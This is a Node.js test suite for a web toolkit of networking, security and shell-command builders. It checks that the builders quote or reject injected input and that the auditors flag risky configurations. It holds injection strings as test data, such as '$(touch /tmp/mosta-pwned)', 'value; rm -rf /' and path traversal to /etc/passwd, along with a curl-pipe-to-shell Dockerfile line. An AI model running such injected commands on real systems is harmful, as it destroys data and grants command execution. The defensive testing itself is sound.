import test from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import vm from 'node:vm';
import { webcrypto } from 'node:crypto';
import { TextDecoder } from 'node:util';

const source = await readFile(new URL('../assets/platform.js', import.meta.url), 'utf8');
const directoryMarkup = await readFile(new URL('../tools.html', import.meta.url), 'utf8');
const homeMarkup = await readFile(new URL('../index.html', import.meta.url), 'utf8');
const siteSource = await readFile(new URL('../assets/site.js', import.meta.url), 'utf8');
const registryDeclaration = /(?:const|let)\s+tools\s*=/.exec(source);
const registryStart = registryDeclaration ? registryDeclaration.index + registryDeclaration[0].length : -1;
const registryMarker = source.indexOf('\n];\nfunction rows', registryStart);
const helpersStart = source.indexOf('function rows(');
const helpersEnd = source.indexOf('const grid=', helpersStart);

assert.ok(registryStart > 0, 'tool registry exists');
assert.ok(registryMarker > registryStart, 'tool registry closes before UI initialization');
assert.ok(helpersStart >= 0 && helpersEnd > helpersStart, 'pure tool helpers exist');

const registryLiteral = source.slice(registryStart, registryMarker + 2);
const helpers = source.slice(helpersStart, helpersEnd);
const tools = vm.runInNewContext(`(()=>{ ${helpers}\n const registry=${registryLiteral}; registry.forEach(withValidatedInputs); return registry; })()`, {
  crypto: webcrypto,
  TextEncoder,
  TextDecoder,
  AbortController,
  Uint8Array,
  atob,
  btoa,
  URL,
  URLSearchParams,
  fetch: async input => ({
    ok: true,
    status: 200,
    async json() {
      if (String(input).includes('ipify')) return { ip: '203.0.113.10' };
      if (String(input).includes('crt.sh')) return [{ id: 7, common_name: 'example.com', not_before: '2026-01-01', not_after: '2027-01-01' }];
      return { Status: 0, Answer: [{ name: 'example.com.', TTL: 300, data: '93.184.216.34' }] };
    },
    async text() { return 'Example Vendor'; },
    async arrayBuffer() { return new ArrayBuffer(64); },
  }),
  performance,
  setTimeout,
  clearTimeout,
  Worker: class {
    postMessage() { this.onmessage?.({ data: { ok: true, matches: [] } }); }
    terminate() {}
  },
  document: { createElement() { let html = ''; return { set innerHTML(value) { html = value; }, get value() { return html.replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&amp;/g, '&'); } }; } },
  DOMParser: class { parseFromString() { return { querySelector() { return null; } }; } },
  XMLSerializer: class { serializeToString() { return '<root><item>value</item></root>'; } },
});
const byId = id => {
  const tool = tools.find(item => item.id === id);
  assert.ok(tool, `tool ${id} exists`);
  return tool;
};


test('IPv4 subnet boundaries preserve RFC 3021 /31 and single-address /32 behavior', () => {
  const pointToPoint = byId('subnet').run({ip:'192.0.2.10',prefix:'31'});
  assert.match(pointToPoint,/Network: 192\.0\.2\.10\/31/);
  assert.match(pointToPoint,/Broadcast: 192\.0\.2\.11/);
  assert.match(pointToPoint,/Usable hosts: 2/);
  const single = byId('subnet').run({ip:'203.0.113.9',prefix:'32'});
  assert.match(single,/First host: 203\.0\.113\.9/);
  assert.match(single,/Last host: 203\.0\.113\.9/);
  assert.match(single,/Usable hosts: 1/);
  assert.throws(()=>byId('subnet').run({ip:'192.168.1.256',prefix:'24'}),/valid IPv4/);
});

test('IPv6 compression handles leading, trailing, all-zero and leftmost longest runs', () => {
  assert.match(byId('ipv6').run({address:'::1'}),/Compressed: ::1/);
  assert.match(byId('ipv6').run({address:'2001:db8::'}),/Compressed: 2001:db8::/);
  assert.match(byId('ipv6').run({address:'::'}),/Compressed: ::/);
  assert.match(byId('ipv6').run({address:'2001:0:0:1:0:0:1:1'}),/Compressed: 2001::1:0:0:1:1/);
  assert.throws(()=>byId('ipv6').run({address:'2001::1::2'}),/standard hexadecimal IPv6/);
});

test('Set-Cookie auditor enforces prefix and SameSite=None invariants', () => {
  const output = byId('cookies').run({cookies:[
    '__Host-session=abc; Secure; Path=/; Domain=example.com',
    'session=abc; SameSite=None',
    '__Secure-id=1; HttpOnly',
  ].join('\n')});
  assert.match(output,/__Host- requires Secure, Path=\/ and no Domain attribute/);
  assert.match(output,/SameSite=None requires Secure/);
  assert.match(output,/__Secure- prefix requires Secure/);
});

test('IP range summarizer emits aligned minimal CIDR blocks and rejects reversed ranges', () => {
  const output = byId('range-cidr').run({start:'192.168.1.1',end:'192.168.1.6'});
  assert.match(output,/192\.168\.1\.1\/32/);
  assert.match(output,/192\.168\.1\.2\/31/);
  assert.match(output,/192\.168\.1\.4\/31/);
  assert.match(output,/192\.168\.1\.6\/32/);
  assert.match(output,/CIDR blocks: 4/);
  assert.throws(()=>byId('range-cidr').run({start:'192.168.1.6',end:'192.168.1.1'}),/End address must not be lower/);
});



test('Linux signal reference returns canonical names for numeric and symbolic lookups', () => {
  const numeric = byId('signals').run({query:'15'});
  const symbolic = byId('signals').run({query:'SIGTERM'});
  assert.match(numeric,/Signal: SIGTERM/);
  assert.match(numeric,/Number: 15/);
  assert.match(symbolic,/Signal: SIGTERM/);
  assert.match(symbolic,/Number: 15/);
  assert.match(byId('signals').run({query:'9'}),/Signal: SIGKILL/);
  assert.match(byId('signals').run({query:'2'}),/Signal: SIGINT/);
});

test('tool processing labels distinguish external requests from local-only processing', () => {
  const external = ['dns','public-ip','mac','latency','speed','crt'];
  for (const tool of tools) {
    assert.equal(Boolean(tool.external),external.includes(tool.id),tool.id+' external classification');
  }
  for (const id of ['hmac','csp','jwt']) assert.equal(byId(id).external,undefined,id+' must remain local');
});

test('all registered tools execute a valid representative input', async () => {
  const samples = {
    key:'local-test-key',
    message:'MOSTA integrity test',
    password:'Correct-Horse-Battery-42!',
    text:'MOSTA test input',
    token:'eyJhbGciOiJub25lIn0.eyJzdWIiOiJkZW1vIn0.',
    config:'enable secret test-secret\nno ip http server\ntransport input ssh\nlogin local\nexec-timeout 5 0',
    left:'before\nsame',
    right:'after\nsame',
    query:'SIGTERM',
    file:{name:'sample.txt',size:5,arrayBuffer:async()=>new TextEncoder().encode('hello').buffer},
  };
  const failures=[];
  for (const tool of tools) {
    const values={};
    for (const field of tool.fields||[]) {
      const [key,,defaultValue,type,options]=field;
      if (type==='file') values[key]=samples.file;
      else if (defaultValue!==undefined&&defaultValue!=='') values[key]=defaultValue;
      else if (type==='select') values[key]=options?.[0]??'';
      else if (Object.hasOwn(samples,key)) values[key]=samples[key];
      else if (key==='domain') values[key]='example.com';
      else if (key==='text'||key==='message') values[key]='MOSTA test input';
      else if (key==='password') values[key]='Correct-Horse-Battery-42!';
      else if (key==='token') values[key]=samples.token;
      else values[key]='sample input';
    }
    try {
      const output=await tool.run(values);
      assert.ok(output!==undefined&&output!==null,String(tool.id)+' returned no output');
      assert.ok(String(output).length>0,String(tool.id)+' returned empty output');
    } catch (error) {
      failures.push(tool.id+': '+(error?.message||String(error)));
    }
  }
  assert.deepEqual(failures,[], 'Every tool should execute its representative input without an unexpected error');
});

test('external provider lookups use abortable request timeouts', async () => {
  const externalLines=source.split(/\r?\n/).filter(line=>line.includes('external:true'));
  assert.ok(externalLines.length>=6);
  for(const line of externalLines)assert.match(line,/fetchWithTimeout\(/);
  const sandbox={AbortController,setTimeout,clearTimeout,fetch:(_url,options)=>new Promise((resolve,reject)=>{
    options.signal.addEventListener('abort',()=>reject(new Error('aborted')),{once:true});
  })};
  const request=vm.runInNewContext(`${helpers}; fetchWithTimeout('https://example.test',{},5)`,sandbox);
  await assert.rejects(request,/External request timed out/);
});

test('select inputs reject values outside their declared allowlists', () => {
  let checked=0;
  for(const tool of tools){
    for(const field of tool.fields||[]){
      if(field[3]!=='select')continue;
      const [key,label,, ,options]=field;
      const values=Object.fromEntries((tool.fields||[]).map(item=>[item[0],item[2]??'']));
      values[key]='__MOSTA_INVALID_OPTION__';
      assert.throws(()=>tool.run(values),/Invalid option for .*Choose one of the listed values/,tool.id+' rejects invalid '+label);
      checked++;
    }
  }
  assert.ok(checked>=20,'Expected broad coverage of enumerated select fields');
});

test('quick navigation button is injected into existing nav actions without stealing the tool-search shortcut', () => {
  assert.match(siteSource, /if\(!\$\('#openPalette'\)\)/);
  assert.match(siteSource, /e\.shiftKey&&e\.key\.toLowerCase\(\)==='k'/);
  assert.match(source, /e\.key\.toLowerCase\(\)==='k'&&search/);
});

test('homepage search and quick-access deep links resolve to real tool workspaces', () => {
  assert.match(homeMarkup,/id="homeToolSearch"/);
  assert.match(source,/homeSearch\?\.addEventListener\('keydown'/);
  assert.match(source,/if\(params\.get\('tool'\)\)openTool\(params\.get\('tool'\)\);/);
  const deepLinks=[...homeMarkup.matchAll(/href="tools\.html\?tool=([^"]+)"/g)].map(match=>decodeURIComponent(match[1]));
  assert.ok(deepLinks.length>0,'Homepage exposes quick-access tool links');
  for(const id of deepLinks)assert.ok(tools.some(tool=>tool.id===id),'Homepage deep link resolves: '+id);
});

test('tool registry has unique IDs and eleven declared workspaces', () => {
  const ids = tools.map(tool => tool.id);
  assert.equal(new Set(ids).size, ids.length);
  assert.equal(tools.length, 239);
  assert.deepEqual(
    [...new Set(tools.map(tool => tool.cat))].sort(),
    ['bash','cloud','database','developer','kali','linux','networking','security','soc','termux','ubuntu'].sort(),
  );
  const expected={networking:21,security:41,linux:36,developer:20,soc:37,bash:13,kali:28,ubuntu:13,cloud:13,database:2,termux:15};
  for(const [category,count] of Object.entries(expected))
    assert.equal(tools.filter(tool=>tool.cat===category).length,count,category+' tool count');
});



test('new operating-system workspaces contain real handlers and explicit command-only boundaries', async () => {
  const required = [
    
    'bash-quote-builder','bash-array-builder','bash-script-audit','bash-check-command',
    'kali-nmap-builder','kali-tcpdump-filter','kali-monitor-capability','kali-suid-audit',
    'linux-find-builder','linux-df-analyzer','linux-process-review',
    'ubuntu-apt-plan','ubuntu-netplan-review','ubuntu-apparmor-audit','ubuntu-cloud-init-audit',
  ];
  for (const id of required) {
    const tool=byId(id);
    assert.equal(typeof tool.run,'function',id+' handler');
  }
  for (const tool of tools.filter(x=>x.mode==='command')) {
    assert.match(String(await tool.run(Object.fromEntries((tool.fields||[]).map(f=>[f[0],f[2]??''])))),/./,tool.id+' generated output');
  }
  assert.match(byId('kali-nmap-builder').disclaimer,/authorized/i);
  assert.match(byId('ubuntu-ufw-builder').disclaimer,/remote access/i);
});

test('Bash argument and environment tools preserve quoting and avoid echoing secret values', () => {
  const quoted=byId('bash-quote-builder').run({value:"it's a test"});
  assert.match(quoted, /\\/);
  const array=byId('bash-array-builder').run({values:'one\nvalue with spaces\nthree'});
  assert.match(array,/'value with spaces'/);
  assert.match(array,/\$\{items\[@\]\}/);
  const audit=byId('bash-env-audit').run({content:'API_TOKEN=super-secret-value\nAPP_ENV=prod'});
  assert.match(audit,/API_TOKEN appears sensitive/);
  assert.doesNotMatch(audit,/super-secret-value/);
});

test('Kali command builders validate targets and produce bounded defensive commands', () => {
  const cmd=byId('kali-nmap-builder').run({target:'192.0.2.0/24',profile:'common-ports',timing:'3'});
  assert.match(cmd,/nmap -sT --top-ports 100 -T3/);
  assert.throws(()=>byId('kali-nmap-builder').run({target:'192.0.2.0/33',profile:'common-ports',timing:'3'}),/0 to 32/);
  assert.match(byId('kali-wireshark-filter').run({protocol:'dns',ipaddr:'192.0.2.10',port:'53'}),/dns && ip.addr == 192.0.2.10/);
});

test('Linux find builder and Bash loop reject unsafe paths and arguments', () => {
   const find=byId('linux-find-builder').run({path:'$HOME/logs',type:'f',pattern:'*.log',days:'7'});
   assert.match(find,/find "\$HOME"\/logs -type f -name '\*\.log'/);
   assert.throws(()=>byId('linux-find-builder').run({path:'~attacker/logs',type:'f',pattern:'*.log',days:'7'}),/absolute or safe home-directory path/i);
   assert.throws(()=>byId('linux-find-builder').run({path:'$HOME/../etc',type:'f',pattern:'*.log',days:'7'}),/parent traversal/i);
   const loop=byId('bash-loop-builder').run({kind:'lines',source:'$HOME/logs.txt'});
   assert.match(loop,/done < "\$HOME"\/logs\.txt/);
   assert.throws(()=>byId('bash-loop-builder').run({kind:'array',source:'items;touch /tmp/pwned'}),/valid Bash variable name/i);
 });

test('Linux and Ubuntu analyzers detect risky conditions in pasted command output', () => {
  assert.match(byId('linux-df-analyzer').run({output:'Filesystem 1024-blocks Used Available Capacity Mounted on\n/dev/sda1 1000 900 100 90% /',threshold:'80'}),/WARNING/);
  assert.match(byId('ubuntu-cloud-init-audit').run({config:'ssh_pwauth: true\ndisable_root: false\nsudo: ALL=(ALL) NOPASSWD:ALL'}),/passwordless sudo/);
  assert.match(byId('ubuntu-source-audit').run({sources:'deb [trusted=yes] http://repo.example.test stable main'}),/trusted=yes/);
});

test('tool directory exposes accessible navigation, search, category filters and a real tool workspace', () => {
  assert.match(directoryMarkup, /<html lang="en">/);
  assert.match(directoryMarkup, /<main id="main-content">/);
  assert.match(directoryMarkup, /id="toolSearch"[^>]*type="search"/);
  assert.match(directoryMarkup, /id="toolGrid"[^>]*aria-live="polite"/);
  assert.match(directoryMarkup, /id="categoryTabs"/);
  for (const category of ['all','networking','security','soc','linux','ubuntu','kali','bash','developer']) {
    assert.match(source, new RegExp(category));
  }
  assert.match(directoryMarkup,/id="categoryTabs"/);
  assert.match(source,/function renderCategories\(\)/);
  assert.match(source,/function setCategory\(/);
  assert.match(directoryMarkup, /role="dialog" aria-modal="true"/);
  assert.match(directoryMarkup, /id="toolRunForm"/);
  assert.match(directoryMarkup, /id="toolResult" aria-live="polite"/);
  assert.match(directoryMarkup, /id="clearToolSearch"/);
});

test('IOC extractor normalizes defanged indicators and classifies hashes', () => {
  const hash = 'a'.repeat(64);
  const output = byId('ioc-extractor').run({
    data: `hxxps://evil[.]example/path bad[.]example 203.0.113.9 ${hash}`,
  });
  assert.match(output, /https:\/\/evil\.example\/path/);
  assert.match(output, /bad\.example/);
  assert.match(output, /203\.0\.113\.9/);
  assert.match(output, /SHA-256/);
  assert.match(output, /URLs \(1\)/);
});

test('SSH and PAM triage counts failed and successful authentication events', () => {
  const output = byId('auth-log-triage').run({
    log: [
      'Nov 15 10:15:22 host sshd[123]: Failed password for invalid user admin from 203.0.113.8 port 51022 ssh2',
      'Nov 15 10:16:02 host sshd[124]: Failed password for root from 203.0.113.8 port 51024 ssh2',
      'Nov 15 10:17:10 host sshd[130]: Accepted publickey for deploy from 192.0.2.15 port 51100 ssh2',
    ].join('\n'),
  });
  assert.match(output, /Parsed events: 3/);
  assert.match(output, /Failed \/ PAM failures: 2/);
  assert.match(output, /Successful logins: 1/);
  assert.match(output, /203\.0\.113\.8 — 2 event\(s\)/);
});

test('timeline sorter orders timestamps by absolute UTC time', () => {
  const output = byId('log-timeline').run({
    events: [
      '2026-11-15T10:02:00Z host-a authentication failed',
      '2026-11-15T09:58:00Z host-b service started',
      '2026-11-15T10:01:30+02:00 host-c alert raised',
    ].join('\n'),
  });
  assert.ok(output.indexOf('host-c alert raised') < output.indexOf('host-b service started'));
  assert.ok(output.indexOf('host-b service started') < output.indexOf('host-a authentication failed'));
  assert.match(output, /UNPARSED LINES \(0\)/);
});

test('Windows event reference returns investigation context for known IDs', () => {
  const output = byId('windows-event-reference').run({ eventId: '4625' });
  assert.match(output, /Failed logon/);
  assert.match(output, /password spraying or brute force/);
  assert.match(byId('windows-event-reference').run({ eventId: '999999' }), /not in this quick-reference list/);
});

test('SOC tools reject empty inputs instead of returning misleading results', () => {
  assert.throws(() => byId('ioc-extractor').run({ data: '  ' }), /Paste text/);
  assert.throws(() => byId('auth-log-triage').run({ log: '' }), /Paste authentication log/);
  assert.throws(() => byId('log-timeline').run({ events: '' }), /Paste log lines/);
});

test('CIDR overlap checker distinguishes containment and separate networks', () => {
  const contained = byId('cidr-overlap').run({ networkA: '10.10.0.0/16', networkB: '10.10.20.0/24' });
  assert.match(contained, /Overlap: YES/);
  assert.match(contained, /Network B is inside A/);
  const separate = byId('cidr-overlap').run({ networkA: '10.0.0.0/24', networkB: '10.0.1.0/24' });
  assert.match(separate, /Overlap: NO/);
});

test('URL triage reports obvious risk signals without fetching the URL', () => {
  const output = byId('url-risk-review').run({ url: 'http://user:pass@xn--bcher-kva.example:8080/path%40x' });
  assert.match(output, /does not use HTTPS/);
  assert.match(output, /embedded user information/);
  assert.match(output, /punycode/);
  assert.match(output, /non-standard destination port/);
});

test('OpenSSH configuration audit flags risky directives', () => {
  const output = byId('sshd-config-audit').run({
    config: 'PermitRootLogin yes\nPasswordAuthentication yes\nPermitEmptyPasswords no\nPubkeyAuthentication yes\nX11Forwarding yes\nMaxAuthTries 6',
  });
  assert.match(output, /permitrootlogin: yes \[RISK\]/i);
  assert.match(output, /passwordauthentication: yes \[RISK\]/i);
  assert.match(output, /x11forwarding: yes \[RISK\]/i);
  assert.match(output, /maxauthtries: 6 \[REVIEW\]/i);
  const duplicate = byId('sshd-config-audit').run({ config: 'PermitRootLogin no\nPermitRootLogin yes' });
  assert.match(duplicate, /permitrootlogin: no \[OK\]/i);
  assert.match(duplicate, /duplicate directives: permitrootlogin/i);
});

test('query string builder safely encodes values and preserves duplicate keys', () => {
  const output = byId('query-string-builder').run({
    base: 'https://example.com/search',
    params: 'q=network security\ntag=linux\ntag=security',
  });
  assert.match(output, /q=network\+security/);
  assert.match(output, /tag=linux&tag=security/);
  assert.match(output, /Parameter count: 3/);
});


test('every registered utility has a unique ID, description, category and executable handler', () => {
  assert.equal(tools.length, 239);
  for (const tool of tools) {
    assert.match(tool.id, /^[a-z0-9-]+$/);
    assert.ok(tool.name && tool.name.length >= 5, tool.id + ' has a useful name');
    assert.ok(tool.desc && tool.desc.length >= 35, tool.id + ' has a task description');
    assert.ok(['networking','security','soc','linux','ubuntu','kali','bash','termux','developer','cloud','database'].includes(tool.cat));
    assert.equal(typeof tool.run, 'function', tool.id + ' has a run handler');
    const fieldNames = (tool.fields || []).map(field => field[0]);
    assert.equal(new Set(fieldNames).size, fieldNames.length, tool.id + ' has unique input names');
  }
});

test('Cisco wildcard matcher handles subnet and non-contiguous wildcard masks', () => {
  const match = byId('acl-match').run({network:'192.168.10.0',wildcard:'0.0.0.255',host:'192.168.10.25'});
  assert.match(match,/PERMIT MATCH/);
  assert.match(match,/192\.168\.10\.0/);
  const noMatch = byId('acl-match').run({network:'192.168.10.0',wildcard:'0.0.0.255',host:'192.168.11.25'});
  assert.match(noMatch,/NO MATCH/);
  const nonContiguous = byId('acl-match').run({network:'10.0.0.0',wildcard:'0.255.0.255',host:'10.22.0.9'});
  assert.match(nonContiguous,/Non-contiguous/);
  assert.throws(()=>byId('acl-match').run({network:'10.0.0.0',wildcard:'0.0.0.0',host:'999.1.1.1'}),/valid IPv4/);
});

test('web access log analyzer groups status codes and detects suspicious paths', () => {
  const output = byId('access-log-analyzer').run({log:[
    '203.0.113.10 - - [15/Nov/2026:10:15:22 +0000] "GET /.env HTTP/1.1" 404 232',
    '192.0.2.15 - - [15/Nov/2026:10:16:02 +0000] "POST /login HTTP/1.1" 401 512',
    '203.0.113.10 - - [15/Nov/2026:10:17:10 +0000] "GET /wp-login.php HTTP/1.1" 404 232',
  ].join('\n')});
  assert.match(output,/Parsed requests: 3/);
  assert.match(output,/4xx responses: 3/);
  assert.match(output,/Suspicious-path matches: 2/);
  assert.match(output,/203\.0\.113\.10 — 2/);
  assert.throws(()=>byId('access-log-analyzer').run({log:'not an access log'}),/No supported/);
});

test('firewall reviewer identifies exposed management ports and broad inbound policy', () => {
  const output = byId('firewall-review').run({rules:[
    '*filter',
    ':INPUT ACCEPT [0:0]',
    '-A INPUT -p tcp --dport 22 -j ACCEPT',
    '-A INPUT -p tcp --dport 3389 -j ACCEPT',
    'COMMIT',
  ].join('\n')});
  assert.match(output,/INPUT chain default policy is ACCEPT/);
  assert.match(output,/port 22/);
  assert.match(output,/port 3389/);
  const ufw = byId('firewall-review').run({rules:'22/tcp ALLOW Anywhere'});
  assert.match(ufw,/UFW allows 22\/tcp/);
});

test('Dockerfile review flags root, mutable images, secret metadata and unsafe shell pipes', () => {
  const output = byId('dockerfile-audit').run({dockerfile:[
    'FROM ubuntu:latest',
    'ARG API_TOKEN',
    'RUN apt-get update && apt-get install -y curl',
    'ADD . /app',
    'RUN curl https://example.com/install.sh | sh',
  ].join('\n')});
  assert.match(output,/uses :latest/);
  assert.match(output,/No USER instruction/);
  assert.match(output,/Possible secret declared/);
  assert.match(output,/piped directly to a shell/);
  assert.match(output,/ADD at line/);
  assert.throws(()=>byId('dockerfile-audit').run({dockerfile:'   '}),/Paste Dockerfile/);
});


test('IPv4 analyzer classifies common special-purpose ranges instead of calling them public', () => {
  assert.match(byId('ip-analyze').run({ip:'203.0.113.8'}), /Documentation range \(TEST-NET-3\)/);
  assert.match(byId('ip-analyze').run({ip:'198.18.0.1'}), /Benchmarking range/);
  assert.match(byId('ip-analyze').run({ip:'100.64.0.1'}), /CGNAT/);
  assert.match(byId('ip-analyze').run({ip:'192.168.1.1'}), /Private-use address/);
  assert.match(byId('ip-analyze').run({ip:'255.255.255.255'}), /Limited broadcast/);
  assert.match(byId('ip-analyze').run({ip:'8.8.8.8'}), /Public or globally routable candidate/);
});

test('CSV converter supports escaped quotes, commas, multiline fields and UTF-8 BOM', () => {
  const output = JSON.parse(byId('csv-json').run({
    csv: '\uFEFFname,notes\r\nAlice,"line one, with comma\nline two"\r\nBob,"said ""hello"""',
  }));
  assert.deepEqual(output, [
    {name:'Alice',notes:'line one, with comma\nline two'},
    {name:'Bob',notes:'said "hello"'},
  ]);
  assert.throws(() => byId('csv-json').run({csv:'name,notes\nAlice,"unfinished'}), /Unclosed quoted field/);
});
test('password generator guarantees selected character classes and requested length', () => {
  const password = byId('password').run({length:'32',symbols:'yes'});
  assert.equal(password.split('\n')[0].length,32);
  const value = password.split('\n')[0];
  assert.match(value,/[a-z]/);
  assert.match(value,/[A-Z]/);
  assert.match(value,/[2-9]/);
  assert.match(value,/[!@#$%^&*()\-_=\+\[\]{}?]/);
  const noSymbols = byId('password').run({length:'24',symbols:'no'}).split('\n')[0];
  assert.equal(noSymbols.length,24);
  assert.doesNotMatch(noSymbols,/[^a-zA-Z0-9]/);
});

test('Dockerfile audit evaluates the final stage rather than earlier build stages', () => {
  const unsafe = byId('dockerfile-audit').run({dockerfile:[
    'FROM node:20 AS build',
    'USER node',
    'RUN npm ci',
    'FROM scratch',
    'COPY --from=build /app /app',
    'ENTRYPOINT ["/app"]',
  ].join('\n')});
  assert.match(unsafe,/No USER instruction found in the final build stage/);
  const hardened = byId('dockerfile-audit').run({dockerfile:[
    'FROM node:20 AS build',
    'USER node',
    'RUN npm ci',
    'FROM scratch',
    'COPY --from=build /app /app',
    'USER 65532:65532',
    'ENTRYPOINT ["/app"]',
  ].join('\n')});
  assert.doesNotMatch(hardened,/final build stage may run as root/);
  assert.doesNotMatch(hardened,/Base image is unpinned/);
  const switchedBack = byId('dockerfile-audit').run({dockerfile:[
    'FROM node:20',
    'USER app',
    'RUN npm ci',
    'USER root',
    'CMD ["node","server.js"]',
  ].join('\n')});
  assert.match(switchedBack,/switches to the root user/);
  const numericRoot = byId('dockerfile-audit').run({dockerfile:[
    'FROM node:20',
    'USER 1000:1000',
    'USER 0:0',
  ].join('\n')});
  assert.match(numericRoot,/switches to the root user/);
});


test('Base64 encoder and decoder preserve UTF-8 text and reject malformed input', () => {
  const input = 'MOSTA — الشبكات والأمن 🔐';
  const encoded = byId('base64').run({ text: input, mode: 'encode' });
  assert.match(encoded,/^[A-Za-z0-9+/]+={0,2}$/);
  assert.equal(byId('base64').run({ text: encoded, mode: 'decode' }),input);
  assert.throws(()=>byId('base64').run({text:'%%%not-base64%%%',mode:'decode'}),/Base64/);
});

test('chmod calculator preserves setuid, setgid and sticky permission bits', () => {
  const setuid = byId('chmod').run({mode:'4755'});
  assert.match(setuid,/Symbolic: rwsr-xr-x/);
  assert.match(setuid,/Special bits: setuid/);
  const sticky = byId('chmod').run({mode:'1777'});
  assert.match(sticky,/Symbolic: rwxrwxrwt/);
  assert.match(sticky,/Special bits: sticky/);
  const regular = byId('chmod').run({mode:'0644'});
  assert.match(regular,/Symbolic: rw-r--r--/);
  assert.match(regular,/Special bits: none/);
});


test('all browser-independent tools execute with representative inputs', async () => {
  const overrides = {
    hmac: { key: 'ci-test-key', message: 'MOSTA test message' },
    strength: { password: 'CorrectHorseBatteryStaple!42' },
    'hash-text': { text: 'MOSTA regression test' },
    jwt: { token: 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.signature' },
    config: { config: 'enable secret test\ntransport input ssh\nlogin local' },
    'ioc-extractor': { data: 'hxxps://evil[.]example/path bad[.]example 203.0.113.9 ' + 'a'.repeat(64) },
    'hash-file': { file: { name: 'sample.txt', size: 3, async arrayBuffer() { return new Uint8Array([1,2,3]).buffer; } } },
  };
  const browserWorkerOnly = new Set(['regex']);
  for (const tool of tools) {
    if (browserWorkerOnly.has(tool.id)) continue;
    const values = Object.fromEntries((tool.fields || []).map(field => [
      field[0],
      field[3] === 'file' ? { name: 'sample.txt', size: 3, async arrayBuffer() { return new Uint8Array([1,2,3]).buffer; } } : (field[2] ?? ''),
    ]));
    Object.assign(values, overrides[tool.id] || {});
    const output = await tool.run(values);
    assert.notEqual(output, undefined, tool.id + ' returned undefined');
    assert.notEqual(output, null, tool.id + ' returned null');
  }
});

test('Bash array builder preserves hostile-looking values as inert single arguments', () => {
  const values = "plain value\nO'Reilly\n$HOME\n\`id\`\n$(touch /tmp/mosta-pwned)\nvalue; rm -rf /";
  const output = byId('bash-array-builder').run({values});
  assert.ok(output.includes("'plain value'"));
  assert.ok(output.includes("'O'\\''Reilly'"));
  assert.ok(output.includes("'$HOME'"));
  assert.ok(output.includes("'\`id\`'"));
  assert.ok(output.includes("'$(touch /tmp/mosta-pwned)'"));
  assert.ok(output.includes("'value; rm -rf /'"));
  assert.ok(output.includes('items=('));
  assert.throws(()=>byId('bash-array-builder').run({values:Array.from({length:201},(_,i)=>String(i)).join('\n')}),/200 values/);
});

test('Bash loop builder validates identifiers and constrains path expressions', () => {
  const array = byId('bash-loop-builder').run({kind:'array',source:'files'});
  assert.ok(array.includes('for item in "${files[@]}"'));
  const lines = byId('bash-loop-builder').run({kind:'lines',source:'$HOME/logs/app.log'});
  assert.ok(lines.includes('done < "$HOME"/logs/app.log'));
  const glob = byId('bash-loop-builder').run({kind:'glob',source:'~/Downloads/*.txt'});
  assert.ok(glob.includes('for file in "$HOME"/Downloads/*.txt'));
  for (const source of ['bad;id','$(id)','../../etc/passwd','name with spaces','a`id`']) {
    assert.throws(()=>byId('bash-loop-builder').run({kind:'lines',source}),undefined,source+' must be rejected');
  }
  assert.throws(()=>byId('bash-loop-builder').run({kind:'array',source:'items;id'}),/valid Bash variable/);
});

test('Bash trap builder restricts handler names and supported signals', () => {
  const output = byId('bash-trap-builder').run({handler:'cleanup_tmp',signals:'EXIT INT TERM'});
  assert.ok(output.includes('TMP_DIR=""'));
  assert.ok(output.includes('[[ -n "$TMP_DIR" && -d "$TMP_DIR" ]] && rm -rf -- "$TMP_DIR"'));
  assert.ok(output.includes('trap cleanup_tmp EXIT'));
  assert.ok(output.includes('trap cleanup_tmp INT'));
  assert.ok(output.includes('trap cleanup_tmp TERM'));
  assert.throws(()=>byId('bash-trap-builder').run({handler:'cleanup;id',signals:'EXIT'}),/valid function/);
  assert.throws(()=>byId('bash-trap-builder').run({handler:'cleanup',signals:'EXIT SIGKILL'}),/only EXIT, INT, TERM or HUP/);
  assert.throws(()=>byId('bash-trap-builder').run({handler:'cleanup',signals:''}),/only EXIT, INT, TERM or HUP/);
});

test('Kali journalctl builder enforces priority, unit, time and line bounds', () => {
  const output = byId('kali-journalctl-builder').run({
    unit:'ssh.service', since:"today's logs", priority:'warning', lines:'250'
  });
  assert.ok(output.includes("journalctl -u 'ssh.service' --since 'today'\\''s logs' -p warning -n 250"));
  assert.throws(()=>byId('kali-journalctl-builder').run({unit:'ssh.service',since:'1 hour ago',priority:'warning;id',lines:'10'}),/Invalid option for Priority/);
  assert.throws(()=>byId('kali-journalctl-builder').run({unit:'ssh.service',since:'1 hour ago',priority:'warning',lines:'0'}),/whole number from 1 to 10000/);
  assert.throws(()=>byId('kali-journalctl-builder').run({unit:'ssh.service',since:'1 hour ago',priority:'warning',lines:'10001'}),/whole number from 1 to 10000/);
  assert.throws(()=>byId('kali-journalctl-builder').run({unit:'ssh;id',since:'1 hour ago',priority:'warning',lines:'10'}),/valid unit/);
  assert.throws(()=>byId('kali-journalctl-builder').run({unit:'ssh.service',since:'today\n--no-pager; id',priority:'warning',lines:'10'}),/valid unit and short time expression/);
});

test('Kali and Ubuntu UFW builders reject invalid enums, ports and source addresses', () => {
  for (const id of ['kali-ufw-builder','ubuntu-ufw-builder']) {
    const valid = byId(id).run({action:'allow',port:'443',protocol:'tcp',source:'192.0.2.10'});
    assert.match(valid,/allow from 192\.0\.2\.10 to any port 443 proto tcp/);
    assert.throws(()=>byId(id).run({action:'allow;id',port:'443',protocol:'tcp',source:''}),/Invalid option for (?:Action|Rule action)/);
    assert.throws(()=>byId(id).run({action:'allow',port:'443',protocol:'tcp;id',source:''}),/Invalid option for Protocol/);
    assert.throws(()=>byId(id).run({action:'allow',port:'65536',protocol:'tcp',source:''}),/whole number from 1 to 65535/);
    assert.throws(()=>byId(id).run({action:'allow',port:'443',protocol:'tcp',source:'192.0.2.999'}),/valid IPv4/);
    assert.throws(()=>byId(id).run({action:'allow',port:'443',protocol:'tcp',source:'192.0.2.1; ufw disable'}),/valid IPv4/);
  }
});

test('Linux find builder quotes paths and patterns and rejects traversal or invalid enums', () => {
  const output = byId('linux-find-builder').run({
    path:'/tmp/log archive', type:'f', pattern:'*.log; touch /tmp/pwned', days:'30'
  });
  assert.ok(output.includes("find '/tmp/log archive' -type f -name '*.log; touch /tmp/pwned' -mtime -30 -print"));
  const home = byId('linux-find-builder').run({path:'$HOME/logs',type:'d',pattern:"O'Reilly*",days:'0'});
  assert.ok(home.includes('find "$HOME"/logs -type d -name '));
